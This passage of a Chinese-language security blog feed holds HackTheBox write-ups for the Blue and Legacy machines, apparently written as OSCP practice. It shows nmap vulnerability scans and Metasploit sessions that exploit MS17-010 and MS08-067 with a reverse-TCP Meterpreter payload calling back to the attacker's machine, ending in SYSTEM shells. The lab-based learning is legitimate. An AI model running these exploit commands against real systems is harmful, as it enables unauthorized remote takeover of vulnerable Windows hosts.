%%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%</span><br><span class="line">%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%</span><br><span class="line">%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%</span><br><span class="line">%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%</span><br><span class="line">%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.3.44-dev                          ]</span><br><span class="line">+ -- --=[ 2376 exploits - 1232 auxiliary - 416 post       ]</span><br><span class="line">+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; search CVE-2017-0143</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br><span class="line">   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; use 1 </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) &gt;&gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) &gt;&gt; <span class="built_in">set</span> rhost 10.129.208.2</span><br><span class="line">rhost =&gt; 10.129.208.2</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) &gt;&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:4444 </span><br><span class="line">[*] 10.129.208.2:445 - Target OS: Windows 7 Professional 7601 Service Pack 1</span><br><span class="line">[*] 10.129.208.2:445 - Built a write-what-where primitive...</span><br><span class="line">[+] 10.129.208.2:445 - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[*] 10.129.208.2:445 - Selecting PowerShell target</span><br><span class="line">[*] 10.129.208.2:445 - Executing the payload...</span><br><span class="line">[+] 10.129.208.2:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Sending stage (175686 bytes) to 10.129.208.2</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.30:4444 -&gt; 10.129.208.2:49158) at 2024-10-27 06:13:43 -0500</span><br><span class="line"></span><br><span class="line">(Meterpreter 1)(C:\Windows\system32) &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></div><p>拿下 root。</p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blue_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Recon&quot;&gt;&lt;a href=&quot;#Recon&quot; class=&quot;headerlink&quot; title=&quot;Recon&quot;&gt;&lt;/a&gt;Recon&lt;/h2&gt;&lt;p&gt;先 &lt;code&gt;nmap&lt;/code&gt; 一下：&lt;/p&gt;
&lt;div class=&quot;highlight-containe</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
    
    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Machines Legacy Writeup</title>
    <link href="https://kazma.tw/2024/10/27/HackTheBox-Machines-Legacy-Writeup/"/>
    <id>https://kazma.tw/2024/10/27/HackTheBox-Machines-Legacy-Writeup/</id>
    <published>2024-10-27T09:38:00.249Z</published>
    <updated>2024-10-27T11:10:12.335Z</updated>
    
    <content type="html"><![CDATA[<p>從今天開始想要在考 OSCP 前刷一下 HackTheBox 中跟 OSCP 證照比較相關的機器：<br><a class="link"   href="https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation" >https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>今天要打的是 Windows 的 legacy</p><p>先 <code>nmap</code> 掃一下</p><ul><li><code>-sV</code> 是服務版本偵測</li><li><code>--script=vuln</code> 會針對已知漏洞進行檢查<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap -sV --script=vuln 10.129.152.110</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 05:21 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.152.110</span><br><span class="line">Host is up (0.078s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds</span><br><span class="line">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk <span class="built_in">factor</span>: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 23.14 seconds</span><br></pre></td></tr></table></figure></div>掃描結果是有三個服務開啟，其中有 smb-vuln-ms17-010 的漏洞，是一個 SMB 的 RCE 洞，我們可以用 msfconsole 扁他。<br>結果一直遇到這個問題：<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>Agents:0) exploit(windows/smb/ms17_010_psexec) >> exploit</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:4444 </span><br><span class="line">[*] 10.129.152.110:445 - Target OS: Windows 5.1</span><br><span class="line">[-] 10.129.152.110:445 - Unable to find accessible named pipe!</span><br><span class="line">^[c[*] Exploit completed, but no session was created.1</span><br></pre></td></tr></table></figure></div>超怪，網路上看到有人用這個洞打進去，但是看到有些人是打 netbios 的洞，而且他們用 <code>nmap</code> 用一樣的指令有掃到 CVE-2008-4250 超怪。<br>結果機器重開之後就有了？？？<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap --script vuln 10.129.227.181</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 05:52 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.227.181</span><br><span class="line">Host is up (0.077s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-vuln-ms08-067: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Microsoft Windows system vulnerable to remote code execution (MS08-067)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2008-4250</span><br><span class="line">|           The Server service <span class="keyword">in</span> Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,</span><br><span class="line">|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary</span><br><span class="line">|           code via a crafted RPC request that triggers the overflow during path canonicalization.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2008-10-23</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line">|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk <span class="built_in">factor</span>: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 28.00 seconds</span><br></pre></td></tr></table></figure></div>超蠢結果機器重開就有了：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfconsole</span><br><span class="line">Metasploit tip: Use the edit <span class="built_in">command</span> to open the currently active module </span><br><span class="line"><span class="keyword">in</span> your editor</span><br><span class="line">                                                  </span><br><span class="line">     ,           ,</span><br><span class="line">    /             \</span><br><span class="line">   ((__---,,,---__))</span><br><span class="line">      (_) O O (_)_________</span><br><span class="line">         \ _ /            |\</span><br><span class="line">          o_o \   M S F   | \</span><br><span class="line">               \   _____  |  *</span><br><span class="line">                |||   WW|||</span><br><span class="line">                |||     |||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.3.44-dev                          ]</span><br><span class="line">+ -- --=[ 2376 exploits - 1232 auxiliary - 416 post       ]</span><br><span class="line">+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; search CVE-2008-4250</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                 Disclosure Date  Rank   Check  Description</span></span><br><span class="line">   -  ----                                 ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; use 0</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; <span class="built_in">set</span> rhost 10.129.227.181</span><br><span class="line">rhost =&gt; 10.129.227.181</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:4444 </span><br><span class="line">[*] 10.129.227.181:445 - Automatically detecting the target...</span><br><span class="line">[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English</span><br><span class="line">[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)</span><br><span class="line">[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (175686 bytes) to 10.129.227.181</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.30:4444 -&gt; 10.129.227.181:1039) at 2024-10-27 05:55:37 -0500</span><br><span class="line"></span><br><span class="line">(Meterpreter 1)(C:\WINDOWS\system32) &gt; <span class="built_in">id</span> </span><br><span class="line">[-] Unknown <span class="built_in">command</span>: <span class="built_in">id</span></span><br><span class="line">(Meterpreter 1)(C:\WINDOWS\system32) &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></div></li></ul><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/legacy_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;從今天開始想要在考 OSCP 前刷一下 HackTheBox 中跟 OSCP 證照比較相關的機器：&lt;br&gt;&lt;a class=&quot;link&quot;   href=&quot;https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation&quot; &gt;</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
    
    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
  </entry>
  
</feed>
